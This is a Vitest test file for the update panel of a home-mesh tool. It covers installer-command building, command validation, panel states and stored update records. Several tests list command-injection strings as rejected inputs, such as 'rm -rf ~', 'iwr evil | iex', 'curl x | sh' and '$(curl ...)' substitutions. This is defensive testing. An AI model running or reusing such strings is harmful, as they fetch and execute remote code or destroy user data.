import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import type { NodeSummary } from "../api/types";
import {
  ACTIVE_ROW_STATES, DISMISS_AFTER_S, FINAL_STATUSES, HUB_UPDATE_KEY, NO_WORD_AFTER_S, PATH_MAX, PHASES, PHASE_LABELS, RESTART_PHASES,
  RUN_ID_PATTERN, SHA_PATTERN, SUCCESS_STATUSES, ago, canCheck, clearHubUpdate, commandSourceDir, formatElapsed, hubUpdateRecord,
  installerCommand, isCommand, isRunId, isSha, panelState, phaseLabel, readHubUpdate, reconcileHubUpdate, safeInstallerCommand, shQuote, shortDate,
  shortSha, splitCode, updatableCheck, updateLogText, writeHubUpdate,
} from "../lib/update";
import { MIN, NOW, SHA_B, build, hubNode, iso, node, report, result, row, stored, storedError } from "./updateFixtures";

// The same fixture is checked against homemesh.protocol.update by tests/unit/test_update_web_mirror.py.
const mirror = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), "fixtures", "update-mirror.json"), "utf-8")) as {
  phases: string[]; phase_labels: Record<string, string>; restart_phases: string[]; final_statuses: string[];
  success_statuses: string[]; active_row_states: string[]; no_word_after_s: number; dismiss_after_s: number; path_max: number;
  sha_pattern: string; run_id_pattern: string;
  installer_commands: { os: string; source_dir: string | null; pull: boolean; expected: string }[];
  shas: { value: string; is_sha: boolean; short: string | null }[];
  run_ids: { value: string; is_run_id: boolean }[];
};

describe("mirrors of protocol/update.py", () => {
  it("has the same phases, labels and state sets", () => {
    expect([...PHASES]).toEqual(mirror.phases);
    expect({ ...PHASE_LABELS }).toEqual(mirror.phase_labels);
    expect([...RESTART_PHASES].sort()).toEqual(mirror.restart_phases);
    expect([...FINAL_STATUSES].sort()).toEqual(mirror.final_statuses);
    expect([...SUCCESS_STATUSES].sort()).toEqual(mirror.success_statuses);
    expect([...ACTIVE_ROW_STATES].sort()).toEqual(mirror.active_row_states);
    expect(NO_WORD_AFTER_S).toBe(mirror.no_word_after_s);
    expect(DISMISS_AFTER_S).toBe(mirror.dismiss_after_s);
    expect(PATH_MAX).toBe(mirror.path_max);
    expect(SHA_PATTERN.source).toBe(mirror.sha_pattern);
    expect(RUN_ID_PATTERN.source).toBe(mirror.run_id_pattern);
  });

  it("builds exactly the installer commands Python builds", () => {
    for (const c of mirror.installer_commands) {
      expect(installerCommand(c.os, c.source_dir, { pull: c.pull })).toBe(c.expected);
    }
  });

  it("checks shas and run ids like Python (no trailing-newline match)", () => {
    for (const c of mirror.shas) {
      expect(isSha(c.value)).toBe(c.is_sha);
      expect(shortSha(c.value)).toBe(c.short);
    }
    for (const c of mirror.run_ids) expect(isRunId(c.value)).toBe(c.is_run_id);
    expect(shortSha(null)).toBeNull();
  });

  it("quotes like shlex.quote", () => {
    expect(shQuote("")).toBe("''");
    expect(shQuote("/plain/path-1_2.x")).toBe("/plain/path-1_2.x");
    expect(shQuote("it's")).toBe(`'it'"'"'s'`);
    expect(shQuote("Łódź")).toBe("'Łódź'");
  });
});

describe("phaseLabel", () => {
  it("uses the label of a known phase and shows an unknown phase word as it is", () => {
    expect(phaseLabel("building")).toBe("building the new version");
    expect(phaseLabel("defragmenting")).toBe("defragmenting");
    expect(phaseLabel(null)).toBe("working");
  });
  it("never picks up Object.prototype members", () => {
    expect(phaseLabel("constructor")).toBe("constructor");
    expect(phaseLabel("__proto__")).toBe("__proto__");
    expect(phaseLabel("tostring")).toBe("tostring");
  });
});

describe("commands built from a reported source folder", () => {
  const PLACEHOLDER_WIN = "cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade";
  it("keeps ordinary folders, including spaces, apostrophes and non-ASCII names", () => {
    expect(commandSourceDir("windows", "C:\\Users\\Ann O'Neil\\src\\Łódź HomeMesh")).toBe("C:\\Users\\Ann O'Neil\\src\\Łódź HomeMesh");
    expect(commandSourceDir("linux", "/home/ann/My Projects/Home'Mesh")).toBe("/home/ann/My Projects/Home'Mesh");
    expect(commandSourceDir("linux", "/srv/a$b;rm -rf ~")).toBe("/srv/a$b;rm -rf ~"); // shlex-quoted: inert
    expect(safeInstallerCommand("linux", "/srv/a$b;rm -rf ~", { pull: true }))
      .toBe("cd '/srv/a$b;rm -rf ~' && git pull --ff-only && ./deploy/linux/install.sh --upgrade");
  });
  it("never puts what PowerShell expands inside double quotes into the Windows command", () => {
    for (const dir of ["C:\\x\"; iwr evil | iex; \"", "C:\\Users\\$(iwr evil|iex)\\HomeMesh", "C:\\src\\$HomeMesh",
      "C:\\src\\`$x", "C:\\src\\Home[1]", "C:\\x\u201d; iwr evil | iex; \u201c"]) {
      expect(commandSourceDir("windows", dir)).toBeNull();
      expect(safeInstallerCommand("windows", dir)).toBe(PLACEHOLDER_WIN);
    }
  });
  it("never builds a command from a folder with hidden or bidirectional characters", () => {
    for (const ch of ["\u202e", "\u2067", "\u200b", "\n", "\u0007"]) {
      expect(commandSourceDir("linux", `/home/ann/src${ch}/HomeMesh`)).toBeNull();
      expect(commandSourceDir("windows", `C:\\src${ch}\\HomeMesh`)).toBeNull();
    }
    expect(safeInstallerCommand("linux", "/home/ann/\u202esrc")).toBe("cd <HomeMesh source folder> && ./deploy/linux/install.sh --upgrade");
  });
  it("never builds a command from a folder that may have been cut at the hub's cap on paths", () => {
    const long = `/home/ann/${"d".repeat(PATH_MAX - 10)}`; // exactly PATH_MAX characters: possibly truncated
    expect(commandSourceDir("linux", long)).toBeNull();
    expect(commandSourceDir("linux", long.slice(0, -1))).toBe(long.slice(0, -1));
    // Python caps code points, not UTF-16 units: a 259-character folder of astral characters was kept whole.
    const astral = `C:\\${"\u{1D538}".repeat(PATH_MAX - 4)}`;
    expect(commandSourceDir("windows", astral)).toBe(astral);
    expect(commandSourceDir("windows", `${astral}x`)).toBeNull();
  });
  it("is the mirrored installer command otherwise", () => {
    for (const c of mirror.installer_commands) {
      if (commandSourceDir(c.os, c.source_dir) === (c.source_dir || null)) {
        expect(safeInstallerCommand(c.os, c.source_dir, { pull: c.pull })).toBe(c.expected);
      }
    }
  });
});

describe("time helpers", () => {
  it("formats elapsed time without an estimate", () => {
    expect(formatElapsed(192_000)).toBe("3:12");
    expect(formatElapsed(5_000)).toBe("0:05");
    expect(formatElapsed(3_723_000)).toBe("1:02:03");
    expect(formatElapsed(-5_000)).toBe("0:00");
  });
  it("says how long ago", () => {
    expect(ago(iso(20_000), NOW)).toBe("just now");
    expect(ago(iso(5 * MIN), NOW)).toBe("5 min ago");
    expect(ago(iso(2 * 60 * MIN), NOW)).toBe("2 h ago");
    expect(ago(iso(3 * 24 * 60 * MIN), NOW)).toBe("3 d ago");
    expect(ago("not a date", NOW)).toBeNull();
  });
  it("shows a short date", () => {
    expect(shortDate("2026-10-13T12:00:00Z", NOW)).toBe("13 Oct");
    expect(shortDate("2025-03-02T12:00:00Z", NOW)).toBe("2 Mar 2025");
    expect(shortDate(null, NOW)).toBeNull();
  });
});

describe("splitCode", () => {
  it("splits backtick spans into code parts", () => {
    expect(splitCode("On pc, run `homemesh update allow` now.")).toEqual([
      { code: false, text: "On pc, run " }, { code: true, text: "homemesh update allow" }, { code: false, text: " now." },
    ]);
  });
  it("leaves unbalanced backticks alone", () => {
    expect(splitCode("a ` b")).toEqual([{ code: false, text: "a ` b" }]);
  });
});

describe("isCommand (which hint code gets a Copy button)", () => {
  it("accepts every command of the error table, filled in", () => {
    for (const cmd of [
      "homemesh update allow", "homemesh update status", "homemesh update", "homemesh config validate", "homemesh start",
      "journalctl --user -u 'homemesh-update-*' -n 50", "winget install Git.Git", "gh auth setup-git",
      "git -C /home/ann/src/HomeMesh status", "git -C C:\\Users\\Ann O'Neil\\src\\HomeMesh fetch",
      "git -C /home/ann/src/HomeMesh branch --set-upstream-to=origin/main", "git -C /home/ann/src/HomeMesh log origin/main..HEAD",
      "git config --global --add safe.directory /home/ann/src/HomeMesh", "git -C /home/ann/src/HomeMesh remote -v",
      "git -C /home/ann/src/HomeMesh merge --ff-only", "loginctl enable-linger $USER",
    ]) expect(isCommand(cmd), cmd).toBe(true);
  });
  it("refuses code that would chain, substitute or redirect (a hint arrives from that computer)", () => {
    for (const cmd of [
      "homemesh update allow; iwr http://x.invalid/a | iex", "homemesh update allow && curl x | sh", "homemesh update status | sh",
      "git -C $(curl -s x.invalid) status", "git -C ${IFS}x status", "git -C (iwr x.invalid) status", "git -C @(iwr x) status",
      "homemesh update status > ~/.bashrc", "git -C /src switch <branch>", "git -C x!! status", "homemesh update & calc",
      "git -C {iwr x} status",
    ]) expect(isCommand(cmd), cmd).toBe(false);
    expect(isCommand("ls -la")).toBe(false);
    expect(isCommand("homemesh update status\u202e")).toBe(false);
  });
});

describe("panelState", () => {
  const st = (n: Parameters<typeof panelState>[0], checking = false) => panelState(n, NOW, { checking });

  it("covers the stored check states", () => {
    expect(st(node()).kind).toBe("unchecked");
    expect(st(node({ build: build({ update_allowed: false }) })).kind).toBe("not_allowed");
    expect(st(node({ update_check: stored(result({ behind: 0, commits: [], can_update: false })) })).kind).toBe("up_to_date");
    const behind = st(node({ update_check: stored(result()) }));
    expect(behind).toMatchObject({ kind: "behind", updatable: true });
    expect(st(node({ update_check: storedError("update_not_allowed", "Remote updates are off on pc.", "x") })).kind).toBe("not_allowed");
    expect(st(node({ update_check: storedError("update_dirty_checkout", "dirty", "fix") })).kind).toBe("check_error");
    expect(st(node({ update_check: stored(result()) }), true).kind).toBe("checking");
    expect(st(node({ update_check_pending: "job-check-2" })).kind).toBe("checking");
  });

  it("puts the advisory consent flag below a stored check", () => {
    // `homemesh update allow` takes effect without a reconnect, so the hello's flag can be stale.
    expect(st(node({ build: build({ update_allowed: false }), update_check: stored(result()) })).kind).toBe("behind");
  });

  it("is not updatable with a blocking problem, consent gone, or a build that can't update", () => {
    const blocking = result({ problems: [{ code: "update_diverged", message: "m", hint: "h", blocking: true }], can_update: false });
    expect(st(node({ update_check: stored(blocking) }))).toMatchObject({ kind: "behind", updatable: false });
    expect(st(node({ update_check: stored(result({ allowed: false })) })).kind).toBe("not_allowed");
    expect(updatableCheck(node({ build: build({ can_update: false }), update_check: stored(result()) }))).toBeNull();
  });

  it("knows computers without the updater, unreadable builds and protocol mismatches", () => {
    expect(st(node({ build: null })).kind).toBe("no_updater");
    expect(st(node({ build: undefined })).kind).toBe("no_updater");
    expect(st(node({ build: { invalid: true } })).kind).toBe("invalid_build");
    expect(st(node({ online: false, last_disconnect_reason: "protocol_incompatible: worker supports [2], hub supports [1]" })).kind).toBe("protocol");
    expect(st(node({ build: build({ can_update: false, cannot_update_reason: "no checkout", source: "unknown" }) }))).toMatchObject({ kind: "cannot_update", dev: false });
  });

  it("shows offline unless an outcome is newer than the check", () => {
    expect(st(node({ online: false, update_check: stored(result()) })).kind).toBe("offline");
    const failed = row({ state: "failed", finished_at: iso(MIN), error: { code: "update_stop_failed", message: "m", hint: "h" } });
    expect(st(node({ online: false, update: failed, update_check: stored(result(), 5 * MIN) })).kind).toBe("outcome");
    // A check made after the outcome replaces it.
    expect(st(node({ update: failed, update_check: stored(result({ behind: 0, commits: [], can_update: false }), 10_000) })).kind).toBe("up_to_date");
  });

  it("maps active phases, unknown ones included", () => {
    const at = (phase: string | null) => st(node({ update: row({ phase }) }));
    expect(at(null)).toMatchObject({ kind: "active", step: "ready" });
    expect(at("prechecks")).toMatchObject({ kind: "active", step: "ready" });
    expect(at("building")).toMatchObject({ kind: "active", step: "ready" });
    expect(at("draining")).toMatchObject({ kind: "active", step: "draining" });
    for (const p of ["stopping", "switching", "starting", "verifying", "rolling_back"]) expect(at(p)).toMatchObject({ kind: "active", step: "restarting" });
    expect(at("teleporting")).toMatchObject({ kind: "active", step: "other", phase: "teleporting" });
  });

  it("counts elapsed time from the report's started_at, else from the request", () => {
    const live = report({ phase: "stopping" });
    expect(st(node({ update: row({ phase: "stopping" }), update_live: live }))).toMatchObject({ startedAt: live.started_at });
    const r = row({ phase: "stopping" });
    expect(st(node({ online: false, update: r }))).toMatchObject({ startedAt: r.requested_at });
  });

  it("says 'no word' when this run wasn't heard of for 10 minutes; Dismiss after 15 (the hub's dismiss rule)", () => {
    const silent = (ms: number, over: Partial<NodeSummary> = { online: false }) =>
      st(node({ ...over, update: row({ phase: "verifying", last_report_at: iso(ms) }) }));
    expect(silent(9 * MIN).kind).toBe("active");
    expect(silent(11 * MIN)).toMatchObject({ kind: "no_word", minutes: 11, canDismiss: false });
    expect(silent(16 * MIN)).toMatchObject({ kind: "no_word", minutes: 16, canDismiss: true });
    // Connected and reporting this run: a long build is not silence, however old the last change is.
    expect(silent(30 * MIN, { online: true, update_live: report({ phase: "building" }) }).kind).toBe("active");
    // Connected but reporting no run, or another one (a local run started right after; a report the hub can't
    // read): the hub allows Dismiss here too, and without it the one active update blocks the whole mesh.
    expect(silent(16 * MIN, { online: true, update_live: null })).toMatchObject({ kind: "no_word", minutes: 16, canDismiss: true });
    const other = report({ job_id: null, origin: "local", run_id: "u20261016115900-0a1b2c3e", phase: "cleanup", status: "ok" });
    expect(silent(16 * MIN, { online: true, update_live: other })).toMatchObject({ kind: "no_word", canDismiss: true });
    expect(silent(5 * MIN, { online: true, update_live: other }).kind).toBe("active");
  });

  it("shows a local run reported live, but not a finished one", () => {
    expect(st(node({ update_live: report({ job_id: null, origin: "local", phase: "starting" }) }))).toMatchObject({ kind: "active", local: true, step: "restarting" });
    expect(st(node({ update_live: report({ job_id: null, origin: "local", status: "ok", phase: "cleanup" }) })).kind).toBe("unchecked");
    // A remote run whose row the hub ended as a guess (not_started) still runs: shown, but not called local.
    const guess = row({ state: "not_started", finished_at: iso(MIN) });
    expect(st(node({ update: guess, update_live: report({ phase: "building" }) }))).toMatchObject({ kind: "active", local: false });
  });

  it("makes an abandoned update active again when it reports", () => {
    const n = node({ online: false, update: row({ state: "abandoned", finished_at: iso(MIN), error: { code: "update_abandoned", message: "m", hint: "h" } }) });
    expect(st(n)).toMatchObject({ kind: "outcome" });
    expect(st({ ...n, online: true, update: row({ state: "running", phase: "verifying", last_report_at: iso(0) }) })).toMatchObject({ kind: "active", step: "restarting" });
  });

  it("allows checks only for online computers with the updater and nothing running", () => {
    expect(canCheck(node())).toBe(true);
    expect(canCheck(node({ online: false }))).toBe(false);
    expect(canCheck(node({ build: null }))).toBe(false);
    expect(canCheck(node({ update_check_pending: "j" }))).toBe(false);
    expect(canCheck(node({ update: row() }))).toBe(false);
    expect(canCheck(node(), { checking: true })).toBe(false);
  });
});

describe("hub update record", () => {
  afterEach(() => window.localStorage.clear());

  it("round-trips through localStorage and rejects junk", () => {
    const hub = hubNode();
    const rec = hubUpdateRecord(hub, hub.build as ReturnType<typeof build>, SHA_B, NOW);
    expect(writeHubUpdate(rec)).toBe(true);
    expect(readHubUpdate(NOW)).toEqual(rec);
    window.localStorage.setItem(HUB_UPDATE_KEY, "{not json");
    expect(readHubUpdate(NOW)).toBeNull();
    window.localStorage.setItem(HUB_UPDATE_KEY, JSON.stringify({ ...rec, expected_commit: "<img src=x>" }));
    expect(readHubUpdate(NOW)).toBeNull();
    expect(window.localStorage.getItem(HUB_UPDATE_KEY)).toBeNull(); // malformed records are removed
    writeHubUpdate(rec);
    expect(readHubUpdate(NOW + 8 * 24 * 3600 * 1000)).toBeNull(); // a week old: dropped
    clearHubUpdate();
  });

  it("survives a storage that throws", () => {
    const orig = Object.getOwnPropertyDescriptor(window, "localStorage")!;
    Object.defineProperty(window, "localStorage", { configurable: true, get: () => { throw new Error("SecurityError"); } });
    try {
      expect(readHubUpdate(NOW)).toBeNull();
      expect(writeHubUpdate(hubUpdateRecord(hubNode(), build(), SHA_B, NOW))).toBe(false);
      expect(() => clearHubUpdate()).not.toThrow();
    } finally {
      Object.defineProperty(window, "localStorage", orig);
    }
  });

  it("is reconciled with the node list", () => {
    const hub = hubNode();
    const rec = { ...hubUpdateRecord(hub, build(), SHA_B, NOW), update_id: "job-apply-1" };
    expect(reconcileHubUpdate(rec, [hubNode({ update: row({ run_id: null, phase: "building" }) })], NOW)).toEqual({ action: "keep" });
    expect(reconcileHubUpdate(rec, [hubNode({ update: row({ phase: "building" }) })], NOW))
      .toEqual({ action: "update", record: { ...rec, run_id: "u20261016115500-0a1b2c3d" } });
    expect(reconcileHubUpdate(rec, [hubNode({ update: row({ state: "ok", finished_at: iso(0) }) })], NOW)).toEqual({ action: "clear", outcome: "ok" });
    expect(reconcileHubUpdate(rec, [hubNode({ update: row({ state: "abandoned", run_id: null }) })], NOW)).toEqual({ action: "keep" });
    expect(reconcileHubUpdate(rec, [hubNode({ update: row({ id: "other" }) })], NOW)).toMatchObject({ action: "clear" });
    expect(reconcileHubUpdate(rec, [node()], NOW)).toMatchObject({ action: "clear" });
    // The apply request never answered: adopt a matching active row, or give up after 10 minutes.
    const unsent = { ...rec, update_id: null };
    expect(reconcileHubUpdate(unsent, [hubNode({ update: row() })], NOW)).toMatchObject({ action: "update", record: { update_id: "job-apply-1" } });
    expect(reconcileHubUpdate(unsent, [hubNode()], NOW + 60_000)).toEqual({ action: "keep" });
    expect(reconcileHubUpdate(unsent, [hubNode()], NOW + 11 * MIN)).toMatchObject({ action: "clear" });
  });

  it("names the log the same way the computer does", () => {
    expect(updateLogText("windows", "C:\\HM\\logs\\", "u20261016115500-0a1b2c3d")).toBe("C:\\HM\\logs\\update-u20261016115500-0a1b2c3d.log");
    expect(updateLogText("linux", "/var/log/hm", "u20261016115500-0a1b2c3d")).toBe("/var/log/hm/update-u20261016115500-0a1b2c3d.log");
    expect(updateLogText("linux", "/var/log/hm", null)).toBe("the newest update-u*.log in /var/log/hm");
    expect(updateLogText("linux", null, null)).toBe("the newest update-u*.log in HomeMesh's logs folder");
  });
});
